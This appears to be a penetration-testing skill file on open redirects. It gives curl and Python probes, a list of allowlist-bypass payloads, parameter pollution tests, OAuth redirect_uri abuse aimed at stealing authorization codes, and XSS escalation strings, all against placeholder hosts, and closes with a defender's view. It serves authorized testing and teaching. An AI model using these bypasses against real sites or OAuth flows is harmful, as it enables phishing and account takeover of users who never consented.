---
name: open-redirect
description: Use when testing for unvalidated redirects and forwards on an
  authorized engagement. Covers finding redirect parameters (next, returnUrl,
  redirect_uri, continue), payload bypasses for domain allowlists (double
  slashes, backslashes, encoded dots, @ tricks, subdomain tricks, parameter
  pollution), JavaScript and meta refresh redirects, and OAuth redirect_uri
  abuse leading to authorization code and token theft. Use when login flows,
  logout links, or error pages redirect to user-controlled URLs, or when
  phishing impact needs proof.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-xss, webapp-pentest-methodology]
tools:
  - name: Burp Suite
    version: "2026.2"
  - name: Python
    version: "3.12"
---

An open redirect happens when the application sends the user to a URL taken
from request input without validating it. Alone it looks minor, but it is
the engine behind convincing phishing (the link shows the trusted domain),
OAuth token theft, and chained XSS. This skill covers the authorized
methodology: finding redirect sinks, testing allowlist bypasses, handling
JavaScript and meta refresh redirects, and abusing OAuth redirect URIs.
All testing targets systems you have written permission to test.

## Quick Workflow

1. Crawl the application and collect every parameter that influences a
   redirect: `next`, `return`, `returnUrl`, `redirect`, `redirect_uri`,
   `continue`, `dest`, `url`, `r`, `to`.
2. Test each with a canary external domain and record the response: 30x
   Location header, JavaScript redirect, or meta refresh.
3. If a filter blocks the canary, work through the bypass list in order:
   scheme tricks, slash tricks, encoding, @ tricks, subdomain tricks.
4. Test parameter pollution and path confusion variants for filters that
   inspect only one copy of the parameter.
5. Check OAuth and SSO flows: `redirect_uri` validation is the highest
   value target.
6. Prove phishing impact with a full crafted link and a screenshot of the
   trusted domain sending the browser to the test domain.
7. Record every payload, the exact response, and the filter behavior for
   the report.

## 1. Finding redirect parameters

Redirect parameters appear in login, logout, registration, language
switchers, and error pages. Harvest them from crawling and from proxy
history.

```bash
# Grep proxy history or Burp target for common redirect parameter names
grep -oiE '[?&](next|return|returnurl|redirect|redirect_uri|continue|dest|destination|url|r|to|forward)=[^& ]+' \
  /tmp/burp-target-export.txt | sort -u | head -40
```

```bash
# Quick manual sweep of the obvious endpoints with a canary value
for endpoint in "/login?next=" "/logout?return=" "/sso?redirect_uri="; do
  echo "== $endpoint =="
  curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
    "https://target.example${endpoint}https://canary.example/x"
done
```

Also watch for redirects that happen in JavaScript (`window.location =`,
`location.href =`, `location.replace(`) and in meta refresh tags, which
curl's `%{redirect_url}` will not show. Load the page and read the body:

```bash
curl -s 'https://target.example/goto?url=https://canary.example/x' \
  | grep -oiE '(window\.location[^;]*|meta[^>]*refresh[^>]*)' | head -5
```

## 2. Basic payload tests

Confirm the sink is really open before spending time on bypasses. Use a
domain you control for the test (a local test server or a canary domain),
never a real third party.

```bash
# Absolute URL: the classic test
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
  'https://target.example/redirect?url=https://canary.example/pwned'

# Protocol-relative URL (inherits https from the page)
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
  'https://target.example/redirect?url=//canary.example/pwned'

# Single slash path (should stay on-site: control case)
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
  'https://target.example/redirect?url=/dashboard'
```

A 301, 302, 303, or 307 to the canary confirms the open redirect. A 200
with the canary in a `Location` meta tag or JS assignment confirms the
client-side variants. Record the exact status code and header.

## 3. Allowlist bypass techniques

Filters usually try to keep redirects on-site. Work through these
bypasses in order, testing each against the live filter.

```bash
BASE='https://target.example/redirect?url='
t() { curl -s -o /dev/null -w "%{http_code} -> %{redirect_url}\n" "$BASE$1"; }

t 'https://canary.example'            # baseline, expect block
t '//canary.example'                 # protocol-relative
t 'https:\\\\canary.example'         # backslashes (browsers normalize)
t 'https:/canary.example'            # single slash after scheme
t 'https://canary.example%2f..'      # encoded slash confusion
t 'https://target.example@canary.example'   # @ trick: userinfo part
t 'https://target.example%40canary.example' # encoded @
t 'https://canary.target.example'    # subdomain trick vs suffix check
t 'https://targetexample.com'        # lookalike domain vs prefix check
t 'https://target.example.'          # trailing dot
t '/%5ccanary.example'               # encoded backslash path start
```

```bash
# Whitespace and control characters that parsers strip
t '%20https://canary.example'
t 'https://canary.example%09'
# Fragment trick: filter sees the trusted domain, browser may still go elsewhere
t 'https://target.example#@canary.example'
```

A Python loop with a payload file keeps this systematic and logged:

```python
#!/usr/bin/env python3
"""Open-redirect bypass prober (authorized targets only)."""
import urllib.request, urllib.parse

BASE = "https://target.example/redirect?url="
PAYLOADS = [
    "https://canary.example",
    "//canary.example",
    "https:\\\\canary.example",
    "https://target.example@canary.example",
    "https://canary.target.example",
    "https://target.example%2e%2e/canary.example",
]
class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, hdrs, newurl):
        return None
opener = urllib.request.build_opener(NoRedirect)
for p in PAYLOADS:
    url = BASE + urllib.parse.quote(p, safe="")
    try:
        r = opener.open(url, timeout=10)
        print(f"{r.status} no-redirect body-has-canary={'canary' in r.read().decode(errors='replace')}")
    except urllib.error.HTTPError as e:
        print(f"{e.code} -> {e.headers.get('Location')}   payload={p}")
```

## 4. Parameter pollution and logic flaws

When the filter inspects one copy of the parameter but the redirect uses
another, duplicate the parameter.

```bash
# First copy passes the filter, second copy wins the redirect (or reverse)
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
  'https://target.example/redirect?url=/dashboard&url=https://canary.example'

curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
  'https://target.example/redirect?url=https://canary.example&url=/dashboard'
```

Also test case variants of the parameter name (`URL`, `Url`, `REDIRECT`),
array syntax (`url[]=https://canary.example`), and JSON bodies where the
redirect target arrives as `{"url": "..."}` instead of a query string.

## 5. JavaScript and meta refresh redirects

Client-side redirects need different confirmation: fetch the page and
read where it sends the browser.

```bash
# Meta refresh variant
curl -s 'https://target.example/goto?to=https://canary.example' \
  | grep -i 'http-equiv="refresh"'

# JavaScript variant: capture the assignment target
curl -s 'https://target.example/goto?to=https://canary.example' \
  | grep -oE 'location(\.href|)=["'"'"'][^"'"'"']+' | head -5
```

Client-side sinks often have weaker validation than server-side 30x
redirects, and some only encode the payload with `encodeURI`, which
leaves the bypasses from section 3 working. When the value lands inside
a JS string, also test for break-out to XSS: `";alert(1);//`.

## 6. OAuth and SSO redirect_uri abuse

This is the highest-impact open redirect class: a loose `redirect_uri`
lets an attacker receive the victim's authorization code or token.

```bash
# Try registering the flow with an attacker redirect_uri (use test client)
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
  'https://target.example/oauth/authorize?client_id=testclient&response_type=code&redirect_uri=https://canary.example/cb'

# Suffix bypass against registered https://app.target.example/callback
curl -s -o /dev/null -w '%{http_code} -> %{redirect_url}\n' \
  'https://target.example/oauth/authorize?client_id=testclient&response_type=code&redirect_uri=https://app.target.example.evil.example/callback'
```

Test whether the server validates the full URI, only the domain, or only
a prefix. Check for `redirect_uri` values with fragments, query strings
appended to a registered URI, and subdirectory traversal under a
registered path. If authorization codes are issued to the attacker
domain in the lab, that is critical severity: codes become tokens, and
tokens become the victim's account.

## 7. Proving phishing impact

Build the final proof link and screenshot the chain: trusted domain in
the address bar, then arrival at the test domain.

```bash
# Final proof URL (replace with the working bypass payload)
echo 'https://target.example/login?next=https://canary.example/login-lookalike'
```

Document the full click path: where the link would be delivered (email,
support chat), what the victim sees (the real domain), and where they
land (attacker page). If the engagement includes a phishing simulation
clause, coordinate with the client before sending anything to real
users; otherwise keep the proof to screenshots and request logs.

## Edge cases

- The redirect only fires after login: authenticate as the test user
  first, then replay the payload with the session cookie.
- The filter allowlists by regex on the full URL: test regex injection
  via the payload (for example a `?` that makes the rest optional).
- Mobile deep links (`myapp://`): the sink may redirect to app schemes;
  test whether `javascript:` or `data:` schemes are accepted, which
  escalates to XSS on older browsers.
- The application signs redirect URLs (HMAC): look for the signing
  endpoint or a leaked secret rather than fighting the signature.
- POST-based redirects: the parameter arrives in the body, so the curl
  tests need `-d`; Burp Repeater makes this faster.
- The redirect goes through an interstitial warning page ("you are
  leaving our site"): check whether the warning can be skipped with a
  parameter, and note that the warning still counts as a finding but at
  lower severity.

## Escalation

- Open redirect plus reflected input on the landing page: chain into
  XSS by redirecting to `javascript:alert(1)` where the browser still
  honors it, or to a `data:text/html` page.
- Open redirect in OAuth: escalate to full account takeover via code
  theft, as described in section 6.
- Redirect to `//attacker` plus the application reflecting the
  `Referer`: the attacker's page learns the victim's internal URLs.
- The filter blocks everything except relative paths: try
  `/\canary.example` and `//canary.example%2f..` path confusion, which
  some frameworks normalize into absolute URLs server-side.
- No direct redirect but the parameter lands in a link `href` on the
  page: test `javascript:` and `data:` schemes in the href for stored
  or reflected XSS.

## Detection and defender view

Defenders see open redirects as 30x responses whose Location header
points to external domains, especially right after login or logout, and
as user reports of phishing links that start with the company's own
domain. Logs showing `redirect_uri` values outside the registered set
are the OAuth smoking gun. The durable fixes are an explicit allowlist
of redirect targets (path-only redirects where possible), validating
OAuth `redirect_uri` with exact string match against pre-registered
values, and never building redirect targets by concatenating user
input. Warning interstitials help users but do not fix the underlying
trust issue.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application): the entry
  point class.
- CWE-601 (URL Redirection to Untrusted Site, Open Redirect).
- CWE-20 (Improper Input Validation): the root cause class.
- OWASP Testing Guide OTG-CLIENT-004 (Testing for Client-Side URL
  Redirect).
- OAuth 2.0 Security Best Current Practice (RFC draft): exact-match
  redirect_uri validation.
- PortSwigger Web Security Academy: open redirection labs and bypass
  cheat sheet.
